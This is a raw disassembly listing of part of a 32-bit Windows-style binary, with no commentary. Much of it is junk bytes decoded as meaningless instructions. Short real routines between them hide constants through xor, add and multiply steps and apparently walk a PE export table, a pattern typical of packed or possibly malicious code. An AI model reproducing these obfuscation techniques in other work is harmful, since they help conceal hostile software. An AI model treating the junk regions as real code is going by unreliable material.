  405974:	or     al,0xfd
  405976:	mov    BYTE PTR [esp+edx*4+0x22dfbfc6],ah
  40597d:	lahf   
  40597e:	mov    dl,0x73
  405980:	sar    ebx,0xfd
  405983:	pop    esi
  405984:	jbe    0x40593a
  405986:	out    0x6a,eax
  405988:	imul   ebx,DWORD PTR [edx+0x6a4dc4c6],0xffffffd2
  40598f:	push   ebp
  405990:	pop    ebx
  405991:	and    eax,0x626cb7f4
  405996:	shl    DWORD PTR [edi-0x39f281ef],cl
  40599c:	gs pop ss
  40599e:	iret   
  40599f:	shl    BYTE PTR [eax+0x76a2217a],0x14
  4059a6:	test   al,0x55
  4059a8:	sahf   
  4059a9:	push   ds
  4059aa:	mov    ecx,edi
  4059ac:	jg     0x405991
  4059ae:	lahf   
  4059af:	rol    DWORD PTR [ebp+eiz*8+0x5833effc],cl
  4059b6:	xor    bl,BYTE PTR [eax+0x436d6949]
  4059bc:	mov    BYTE PTR [edx+0x23],dh
  4059bf:	jg     0x405a30
  4059c1:	loope  0x405a2b
  4059c3:	inc    ebx
  4059c4:	loope  0x4059c5
  4059c6:	inc    edx
  4059c7:	add    dl,bl
  4059c9:	jl     0x40598b
  4059cb:	scas   al,BYTE PTR es:[edi]
  4059cc:	fwait
  4059cd:	xchg   BYTE PTR [eax+0x25],dl
  4059d0:	inc    ebp
  4059d1:	aas    
  4059d2:	dec    ebp
  4059d3:	mov    ds,WORD PTR [ecx]
  4059d5:	in     eax,dx
  4059d6:	call   0x356d:0x826b2691
  4059dd:	sbb    al,0x19
  4059df:	xchg   edx,eax
  4059e0:	sub    BYTE PTR [edx+0x6d],bh
  4059e3:	in     eax,0xce
  4059e5:	jp     0x4059b3
  4059e7:	jb     0x4059b5
  4059e9:	inc    eax
  4059ea:	ins    DWORD PTR es:[edi],dx
  4059eb:	outs   dx,DWORD PTR fs:[esi]
  4059ed:	push   0xffffff8a
  4059ef:	aas    
  4059f0:	fidiv  WORD PTR [ebp-0x56]
  4059f3:	sbb    dh,al
  4059f5:	push   es
  4059f6:	sub    eax,0xe3753a26
  4059fb:	pop    eax
  4059fc:	out    dx,eax
  4059fd:	sbb    dh,cl
  4059ff:	jmp    0x577e367a
  405a04:	dec    ebx
  405a05:	or     al,0x61
  405a07:	sbb    al,0xd
  405a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a0a:	jnp    0x405a75
  405a0c:	jmp    0x3652caff
  405a11:	xchg   edi,eax
  405a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a13:	into   
  405a14:	(bad)
  405a19:	mov    cl,0xa4
  405a1b:	add    eax,0x4e21688e
  405a20:	and    DWORD PTR [esi],ecx
  405a22:	scas   al,BYTE PTR es:[edi]
  405a23:	jl     0x405a13
  405a25:	out    0x53,al
  405a27:	and    al,0x2e
  405a29:	popa   
  405a2a:	getsec 
  405a2c:	inc    ecx
  405a2d:	aam    0x5b
  405a2f:	xor    DWORD PTR [ecx-0x48],esp
  405a32:	jle    0x405a27
  405a34:	fldcw  WORD PTR [ecx-0x30dfa8bf]
  405a3a:	cmp    eax,DWORD PTR [edx+0x284feaec]
  405a40:	or     al,BYTE PTR [ebx]
  405a42:	out    dx,al
  405a43:	xor    bl,BYTE PTR [edx+0x2d]
  405a46:	and    BYTE PTR [ecx],cl
  405a48:	and    DWORD PTR [ecx],0xee5fd32b
  405a4e:	loopne 0x405a1e
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x7031624d
  405b88:	mov    dl,0x15
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b65
  405b93:	repnz xor eax,0xc81fd0c6
  405b99:	and    al,bh
  405b9b:	outs   dx,BYTE PTR ds:[esi]
  405b9c:	add    al,0x37
  405b9e:	adc    DWORD PTR [edi-0x2e0a0374],ebp
  405ba4:	fcom   DWORD PTR [eax+0x3]
  405ba7:	mov    ebx,0x41050b98
  405bac:	add    eax,0x7876aad2
  405bb1:	scas   eax,DWORD PTR es:[edi]
  405bb2:	lock xlat BYTE PTR ds:[ebx]
  405bb4:	sbb    ah,al
  405bb6:	aad    0xfb
  405bb8:	pop    ecx
  405bb9:	stc    
  405bba:	or     al,0xb5
  405bbc:	sub    eax,ebx
  405bbe:	stos   DWORD PTR es:[edi],eax
  405bbf:	jae    0x405c30
  405bc1:	data16 xor bl,ch
  405bc4:	ficomp DWORD PTR [edx]
  405bc6:	test   al,0x1
  405bc8:	mov    BYTE PTR [eax+0x56],cl
  405bcb:	ins    DWORD PTR es:[edi],dx
  405bcc:	out    dx,al
  405bcd:	scas   eax,DWORD PTR es:[edi]
  405bce:	scas   al,BYTE PTR es:[edi]
  405bcf:	lea    ecx,[edx-0x64]
  405bd2:	dec    eax
  405bd3:	or     ebx,DWORD PTR [esi+0x7f]
  405bd6:	test   al,0x47
  405bd8:	xor    al,0x64
  405bda:	shl    ebp,1
  405bdc:	js     0x405bb2
  405bde:	pop    ds
  405bdf:	test   al,0x5a
  405be1:	cmp    al,0xfa
  405be3:	xchg   ebx,eax
  405be4:	dec    ecx
  405be5:	add    DWORD PTR [eax+edi*4+0x59],edi
  405be9:	sbb    BYTE PTR [ebx-0x61],bl
  405bec:	jb     0x405bac
  405bee:	jb     0x405bd7
  405bf0:	lds    edi,FWORD PTR [edx]
  405bf2:	fwait
  405bf3:	inc    ecx
  405bf4:	xor    DWORD PTR [ecx-0xd],edx
  405bf7:	(bad)  
  405bf8:	jmp    0xd868e730
  405bfd:	or     al,BYTE PTR [eax]
  405bff:	mov    esp,DWORD PTR [ebp-0x6e71412f]
  405c05:	cdq    
  405c06:	pop    esp
  405c07:	mov    edi,0xcbc30eed
  405c0c:	mov    eax,ds:0xd6d5b25a
  405c11:	sub    al,0x8e
  405c13:	push   0x7f4298ca
  405c18:	sbb    ch,dh
  405c1a:	pop    edx
  405c1b:	inc    esp
  405c1c:	popf   
  405c1d:	sahf   
  405c1e:	push   esi
  405c1f:	test   BYTE PTR [edi+0x27],dl
  405c22:	cld    
  405c23:	bound  ebp,QWORD PTR [eax+0x7c]
  405c26:	repnz out dx,eax
  405c28:	or     edi,ebx
  405c2a:	mov    bl,BYTE PTR [esi+0x59]
  405c2d:	jmp    0x405bf0
  405c2f:	ins    DWORD PTR es:[di],dx
  405c31:	outs   dx,BYTE PTR ds:[esi]
  405c32:	sub    ch,BYTE PTR [edx]
  405c34:	add    DWORD PTR [ebx+edx*2+0x69021807],esp
  405c3b:	sbb    al,0x7b
  405c3d:	pushaw 
  405c3f:	sub    DWORD PTR [eax-0x2f],ebx
  405c42:	je     0x405c76
  405c44:	cmp    dl,al
  405c46:	pop    eax
  405c47:	out    0x22,eax
  405c49:	ret    
  405c4a:	inc    ebp
  405c4b:	outs   dx,BYTE PTR ds:[esi]
  405c4c:	jecxz  0x405c94
  405c4e:	sbb    BYTE PTR [edi+ecx*2-0x15d71aeb],0xa6
  405c56:	das    
  405c57:	push   eax
  405c58:	(bad)  
  405c59:	fisttp WORD PTR [eax+0xf220e57]
  405c5f:	mov    esi,0x52e365cd
  405c64:	jle    0x405c52
  405c66:	mov    eax,0x14eb5d39
  405c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c6c:	jp     0x405c52
  405c6e:	and    DWORD PTR [edi+eax*1+0x5a],edi
  405c72:	(bad)  
  405c73:	(bad)  
  405c74:	data16 jbe 0x405cc9
  405c77:	adc    al,0x7b
  405c79:	xor    edi,DWORD PTR [edi]
  405c7b:	push   esp
  405c7c:	outs   dx,BYTE PTR ds:[esi]
  405c7d:	(bad)  
  405c7e:	(bad)  
  405c7f:	pop    ds
  405c80:	sahf   
  405c81:	ja     0x405caf
  405c83:	sbb    BYTE PTR [edi-0x32],0x4c
  405c87:	adc    cl,bh
  405c89:	add    eax,0xc1658c56
  405c8e:	fcmovb st,st(1)
  405c90:	mov    al,ds:0x9bba95fc
  405c95:	shl    BYTE PTR [edx+0x5d],1
  405c98:	jmp    0x9f5408f6
  405c9d:	xchg   ebp,eax
  405c9e:	xchg   ecx,eax
  405c9f:	push   ss
  405ca0:	xchg   edx,eax
  405ca1:	adc    ebp,ecx
  405ca3:	loopne 0x405c34
  405ca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ca6:	das    
  405ca7:	xchg   ebp,eax
  405ca8:	xlat   BYTE PTR ds:[ebx]
  405ca9:	retf   
  405caa:	mov    eax,ds:0x715f0ee6
  405caf:	and    DWORD PTR [esp+ecx*2-0x3e516556],ebx
  405cb6:	mov    ds:0xeec29799,eax
  405cbb:	push   esi
  405cbc:	out    0x62,eax
  405cbe:	xchg   BYTE PTR [edx+0x6cb383ab],cl
  405cc4:	inc    edi
  405cc5:	retf   0xa63d
  405cc8:	ret    0x9762
  405ccb:	push   0xfffffff4
  405ccd:	dec    esp
  405cce:	mov    cl,0x93
  405cd0:	jb     0x405c5d
  405cd2:	add    DWORD PTR [esi+0x307d6cc5],edi
  405cd8:	dec    ecx
  405cd9:	(bad)  
  405cdb:	(bad)  
  405cdc:	unpcklps xmm2,XMMWORD PTR [ebp-0x78174cd5]
  405ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce4:	xchg   edx,eax
  405ce5:	out    dx,al
  405ce6:	rol    ebp,0xf7
  405ce9:	leave  
  405cea:	push   ds
  405ceb:	push   ebp
  405cec:	fsubr  QWORD PTR [edi-0x56]
  405cef:	cmc    
  405cf0:	pop    esi
  405cf1:	push   ss
  405cf2:	pusha  
  405cf3:	inc    edi
  405cf4:	xor    al,0x22
  405cf6:	adc    eax,0x25
  405cf9:	adc    al,0xa
  405cfb:	dec    ebx
  405cfc:	adc    al,0xdf
  405cfe:	push   0x57
  405d00:	imul   ecx,ebp,0xc14dfc4a
  405d06:	cli    
  405d07:	cs loop 0x405c96
  405d0a:	ins    DWORD PTR es:[edi],dx
  405d0b:	and    bh,ch
  405d0d:	cdq    
  405d0e:	sub    al,0x10
  405d10:	sar    DWORD PTR [bx+0x2b4e],1
  405d15:	mov    bl,0x55
  405d17:	dec    ebx
  405d18:	pop    eax
  405d19:	nop
  405d1a:	je     0x405d5b
  405d1c:	sbb    bh,BYTE PTR [ebx]
  405d1e:	aas    
  405d1f:	mov    bh,BYTE PTR [ebx+0x24]
  405d22:	jp     0x405d24
  405d24:	lahf   
  405d25:	jmp    0x810def88
  405d2a:	push   eax
  405d2b:	add    esi,DWORD PTR [ebp+eiz*8+0x2b90617]
  405d32:	mov    esi,DWORD PTR [esi]
  405d34:	jecxz  0x405d12
  405d36:	popf   
  405d37:	adc    eax,DWORD PTR [esi+0x22]
  405d3a:	mov    bh,BYTE PTR [ecx]
  405d3c:	fcmovne st,st(3)
  405d3e:	outs   dx,DWORD PTR ds:[esi]
  405d3f:	add    DWORD PTR [ecx+0x568d4c31],0xc152988e
  405d49:	cld    
  405d4a:	in     al,dx
  405d4b:	sub    dh,BYTE PTR [edx-0x5e]
  405d4e:	dec    edx
  405d4f:	and    BYTE PTR [edx],0x7d
  405d52:	xor    esp,DWORD PTR [edi]
  405d54:	adc    al,0x7e
  405d56:	jae    0x405d0f
  405d58:	int3   
  405d59:	xor    DWORD PTR [esi],0x26135300
  405d5f:	call   0x9b1741b9
  405d64:	cld    
  405d65:	mov    ah,0x9a
  405d67:	dec    DWORD PTR [ecx]
  405d69:	add    edx,DWORD PTR [eax]
  405d6b:	push   eax
  405d6c:	cmp    al,0xf1
  405d6e:	add    al,dh
  405d70:	mov    edi,0x92016049
  405d75:	sar    DWORD PTR [esp+ebx*1+0x60],0x89
  405d7a:	sub    cl,BYTE PTR [eax]
  405d7c:	and    bl,BYTE PTR [esi+ebx*8-0x393d33cb]
  405d83:	push   eax
  405d84:	ins    BYTE PTR es:[edi],dx
  405d85:	cs push cs
  405d87:	mov    ebx,0x8dfd5cb6
  405d8c:	mov    ds:0x111ebcfe,al
  405d91:	fisttp QWORD PTR [ebp-0xdf08e37]
  405d97:	inc    esi
  405d98:	adc    dl,BYTE PTR [esi+0x4857445a]
  405d9e:	fimul  WORD PTR [ebp+0x30]
  405da1:	retf   0xcec4
  405da4:	jmp    0x405d2c
  405da6:	in     al,0x65
  405da8:	inc    ebx
  405da9:	or     dh,BYTE PTR [ecx-0x37]
  405dac:	gs sbb eax,0x89ada5c7
  405db2:	out    0x98,eax
  405db4:	stc    
  405db5:	test   DWORD PTR [ecx+0x3bb313cc],ebx
  405dbb:	aad    0x4b
  405dbd:	leave  
  405dbe:	xchg   ebx,eax
  405dbf:	popf   
  405dc0:	jge    0x405d9d
  405dc2:	dec    ebx
  405dc3:	cmp    DWORD PTR [ebx+edi*8-0x6f],esi
  405dc7:	mul    BYTE PTR [edx]
  405dc9:	in     al,dx
  405dca:	push   esp
  405dcb:	or     eax,0x1d8f9ea8
  405dd0:	test   eax,0x70ae7848
  405dd5:	out    dx,al
  405dd6:	fist   WORD PTR ds:0x1e01b1cb
  405ddc:	mov    bh,0x61
  405dde:	push   0xffffffca
  405de0:	sbb    eax,DWORD PTR [ebx+0x779062c8]
  405de6:	mov    ecx,0x1a9ffc74
  405deb:	(bad)  
  405ded:	jp     0x405df9
  405def:	xlat   BYTE PTR ds:[ebx]
  405df0:	xchg   esi,eax
  405df1:	pop    ds
  405df2:	mov    eax,0xd6ece8d5
  405df7:	mov    eax,0x8e18314d
  405dfc:	jne    0x405e01
  405dfe:	rcl    BYTE PTR [eax-0x57f18e21],0xa4
  405e05:	mov    edx,0xe1da4abc
  405e0a:	inc    ecx
  405e0b:	pop    ebp
  405e0c:	pop    ecx
  405e0d:	add    edx,ecx
  405e0f:	mov    ch,0xa3
  405e11:	and    BYTE PTR [esi-0x16],bh
  405e14:	push   edx
  405e15:	sbb    BYTE PTR [ebp-0x74],bl
  405e18:	jo     0x405daa
  405e1a:	lahf   
  405e1b:	inc    ecx
  405e1c:	adc    esp,DWORD PTR [esi-0x7d6e3c19]
  405e22:	rol    DWORD PTR [ebp+0x6c402717],1
  405e28:	bound  ebp,QWORD PTR [esi+ecx*4]
  405e2b:	jne    0x405e96
  405e2d:	jmp    0xb8cd34ed
  405e32:	jl     0x405e6b
  405e34:	imul   ebx,DWORD PTR [ebp+0x32],0xe
  405e38:	sbb    DWORD PTR [ecx+0x62f6bff6],esi
  405e3e:	inc    ebx
  405e3f:	aas    
  405e40:	xchg   esp,eax
  405e41:	sbb    ah,BYTE PTR [edx]
  405e43:	jns    0x405e66
  405e45:	idiv   BYTE PTR [ebp+ecx*2-0x3efc3dcd]
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xe1
  405ea8:	pop    esi
  405ea9:	and    eax,0x703f3eae
  405eae:	jo     0x405e57
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405ea3
  405eb4:	fmul   DWORD PTR [edi+edx*4]
  405eb7:	arpl   WORD PTR [esi+0x7f5db126],ax
  405ebd:	mov    ebx,0x28921afd
  405ec2:	sahf   
  405ec3:	mov    esp,0xa0b6a09e
  405ec8:	(bad)  
  405ec9:	pop    edx
  405eca:	mov    eax,ds:0xc756d02
  405ecf:	bound  eax,QWORD PTR [ebp-0x4d]
  405ed2:	lahf   
  405ed3:	retf   0xaa84
  405ed6:	xchg   esi,eax
  405ed7:	sbb    eax,0xf1363e9
  405edc:	cmp    bl,cl
  405ede:	stos   DWORD PTR es:[edi],eax
  405edf:	xchg   dh,al
  405ee1:	pop    ss
  405ee2:	int3   
  405ee3:	xor    BYTE PTR [eax-0x20feb281],ah
  405ee9:	mov    ah,0xb3
  405eeb:	stc    
  405eec:	mov    WORD PTR [edx],es
  405eee:	retf   
  405eef:	adc    eax,0x25b082c1
  405ef4:	rcr    dh,0xe9
  405ef7:	out    dx,al
  405ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ef9:	xor    dh,ch
  405efb:	push   ebp
  405efc:	sub    al,0xe8
  405efe:	repnz pushf 
  405f00:	dec    esi
  405f01:	ss pop ds
  405f03:	mov    eax,ds:0xb7e417c0
  405f08:	shl    BYTE PTR [edi+0x32],1
  405f0b:	sbb    eax,0x86908ce5
  405f10:	retf   
  405f11:	or     eax,DWORD PTR cs:[eax-0x1031f6a0]
  405f18:	cli    
  405f19:	stos   DWORD PTR es:[edi],eax
  405f1a:	je     0x405f44
  405f1c:	int    0xa8
  405f1e:	sub    ah,bh
  405f20:	lods   al,BYTE PTR ds:[esi]
  405f21:	aad    0x91
  405f23:	fbld   TBYTE PTR [esi-0x3112d78c]
  405f29:	and    DWORD PTR [esi-0x69f54af1],0xffffffeb
  405f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f31:	std    
  405f32:	arpl   WORD PTR [edx-0xe],sp
  405f35:	push   ebp
  405f36:	jp     0x405f1a
  405f38:	inc    ebx
  405f39:	ret    0x1293
  405f3c:	push   es
  405f3d:	dec    esi
  405f3e:	int3   
  405f3f:	and    edx,DWORD PTR [ecx]
  405f41:	outs   dx,DWORD PTR ds:[esi]
  405f42:	cld    
  405f43:	push   esi
  405f44:	mov    dl,0x3a
  405f46:	jno    0x405eeb
  405f48:	mov    al,0x87
  405f4a:	lods   al,BYTE PTR ds:[esi]
  405f4b:	popf   
  405f4c:	(bad)  
  405f4d:	mov    edx,0xdf99013c
  405f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f53:	push   eax
  405f54:	add    al,0x39
  405f56:	repz dec ebx
  405f58:	jecxz  0x405f7f
  405f5a:	pop    ebx
  405f5b:	adc    ebx,DWORD PTR [ebx-0x55]
  405f5e:	cmp    BYTE PTR [edx-0x2f],dh
  405f61:	push   ecx
  405f62:	out    0x84,al
  405f64:	retf   0x3763
  405f67:	das    
  405f68:	lods   al,BYTE PTR ds:[esi]
  405f69:	and    dh,BYTE PTR [ebp+0x3aa78116]
  405f6f:	lahf   
  405f70:	cmp    al,0x6d
  405f72:	adc    ch,BYTE PTR [edi+0x70]
  405f75:	(bad)  
  405f76:	jnp    0x405fb3
  405f78:	cld    
  405f79:	in     eax,0xce
  405f7b:	shl    ch,cl
  405f7d:	inc    ebp
  405f7e:	in     al,dx
  405f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f80:	sub    bl,BYTE PTR [ebp+ebp*4+0x38]
  405f84:	push   cs
  405f85:	cli    
  405f86:	in     al,dx
  405f87:	stc    
  405f88:	pop    ecx
  405f89:	add    DWORD PTR [edx-0x5f],esi
  405f8c:	fldcw  WORD PTR [esi-0x39]
  405f8f:	stos   DWORD PTR es:[edi],eax
  405f90:	retf   0xb58f
  405f93:	ins    DWORD PTR es:[edi],dx
  405f94:	hlt    
  405f95:	add    ebp,DWORD PTR [esi]
  405f97:	sbb    ebp,DWORD PTR [ecx-0x20]
  405f9a:	jle    0x405fe8
  405f9c:	outs   dx,BYTE PTR ds:[esi]
  405f9d:	shr    BYTE PTR [ecx],cl
  405f9f:	pop    edi
  405fa0:	or     dl,BYTE PTR [ebx-0x27]
  405fa3:	pusha  
  405fa4:	and    BYTE PTR [edx+0x26],bh
  405fa7:	xor    al,0x42
  405fa9:	fcmovnb st,st(2)
  405fab:	jo     0xec235713
  405fb1:	pop    ss
  405fb2:	adc    DWORD PTR [edi],edx
  405fb4:	push   cs
  405fb5:	lods   eax,DWORD PTR ds:[esi]
  405fb6:	(bad)  
  405fb7:	stos   DWORD PTR es:[edi],eax
  405fb8:	call   0x4db4:0xc690174a
  405fbf:	adc    DWORD PTR [esi+0x35450fb6],edx
  405fc5:	lock jno 0x405ffd
  405fc8:	test   BYTE PTR [edx+0x149c927a],ch
  405fce:	popa   
  405fcf:	dec    esp
  405fd0:	xchg   DWORD PTR ds:[ecx-0x1e],esi
  405fd4:	inc    ebp
  405fd5:	out    dx,al
  405fd6:	sbb    BYTE PTR [ebp+0x286094b1],ah
  405fdc:	lods   al,BYTE PTR ds:[esi]
  405fdd:	mov    ch,0x38
  405fdf:	and    eax,0xdefbeb44
  405fe4:	push   0x9653f8a4
  405fe9:	lds    esp,FWORD PTR [edx-0x10]
  405fec:	xchg   ecx,eax
  405fed:	xlat   BYTE PTR ds:[ebx]
  405fee:	je     0x406057
  405ff0:	pop    es
  405ff1:	loop   0x405f98
  405ff3:	out    dx,eax
  405ff4:	mov    ch,0x82
  405ff6:	sbb    edx,edi
  405ff8:	les    ebx,FWORD PTR [edi-0x64ae3db1]
  405ffe:	sbb    dl,BYTE PTR [edx]
  406000:	mov    ds:0x766d3b29,eax
  406005:	div    DWORD PTR [edx]
  406007:	xor    DWORD PTR [edi-0x49d5ec67],ebp
  40600d:	mov    ch,0xb8
  40600f:	mov    ebx,0x247b9cbf
  406014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406015:	push   eax
  406016:	dec    edi
  406017:	out    0x5,eax
  406019:	and    DWORD PTR [edx-0x40],esi
  40601c:	add    ch,BYTE PTR [edi+0x23f2242e]
  406022:	and    DWORD PTR [ecx],0x7c
  406025:	aam    0x25
  406027:	in     al,dx
  406028:	sub    esp,edx
  40602a:	gs test esi,0xef52fd3a
  406031:	in     eax,dx
  406032:	adc    DWORD PTR [edi],edx
  406034:	xchg   esp,eax
  406035:	pop    es
  406036:	lea    ebp,[ebx]
  406038:	fnstcw WORD PTR [esp+edx*4]
  40603b:	pop    edi
  40603c:	ds out dx,eax
  40603e:	retf   0x6d6e
  406041:	retf   
  406042:	outs   dx,BYTE PTR ds:[esi]
  406043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406044:	push   ds
  406045:	outs   dx,BYTE PTR ds:[esi]
  406046:	xor    eax,0xd1818f25
  40604b:	std    
  40604c:	ret    0xaa16
  40604f:	pop    eax
  406050:	sbb    al,0xc9
  406052:	inc    esp
  406053:	in     al,0x57
  406055:	adc    BYTE PTR [ebx+esi*4-0x4332585b],dh
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x1417a096
  4060dc:	fs gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x4060ca
  4060e6:	ja     0x406160
  4060e8:	outs   dx,BYTE PTR ds:[esi]
  4060e9:	outs   dx,BYTE PTR ds:[esi]
  4060ea:	iret   
  4060eb:	sub    ecx,edx
  4060ed:	scas   al,BYTE PTR es:[di]
  4060ef:	leave  
  4060f0:	jecxz  0x406086
  4060f2:	aas    
  4060f3:	inc    ebx
  4060f4:	or     DWORD PTR [ebx-0x1d04895a],edx
  4060fa:	inc    eax
  4060fb:	shl    BYTE PTR [ebx+0x28],1
  4060fe:	adc    BYTE PTR [ebp-0x26544759],cl
  406104:	hlt    
  406105:	addr16 xor al,0x30
  406108:	xor    DWORD PTR [ecx-0x27],esp
  40610b:	in     eax,0x9a
  40610d:	dec    esi
  40610e:	fdiv   QWORD PTR [edx-0x2ac45ca0]
  406114:	dec    esi
  406115:	not    eax
  406117:	mov    ch,0xe1
  406119:	adc    BYTE PTR [ebx],dl
  40611b:	inc    esp
  40611c:	dec    eax
  40611d:	outs   dx,BYTE PTR ds:[esi]
  40611e:	icebp  
  40611f:	call   0x4ab5563
  406124:	and    DWORD PTR [edi],ecx
  406126:	aas    
  406127:	jg     0x4061a0
  406129:	lods   al,BYTE PTR ds:[esi]
  40612a:	pusha  
  40612b:	adc    al,0xc2
  40612d:	ds inc esp
  40612f:	xchg   ebp,eax
  406130:	(bad)  
  406131:	sbb    BYTE PTR [ecx+0x7f585c1],ah
  406137:	data16 lahf 
  406139:	aad    0xcf
  40613b:	(bad)  
  40613c:	call   0x734b19dd
  406141:	sub    esi,ecx
  406143:	push   ss
  406144:	rcl    DWORD PTR [ebx-0x5f9f0070],0x43
  40614b:	push   eax
  40614c:	jp     0x4060e9
  40614e:	or     eax,ebx
  406150:	(bad)  
  406151:	loop   0x40612a
  406153:	mov    eax,0x29327042
  406158:	(bad)  
  406159:	rcr    BYTE PTR [ecx-0x19874ff],1
  40615f:	pusha  
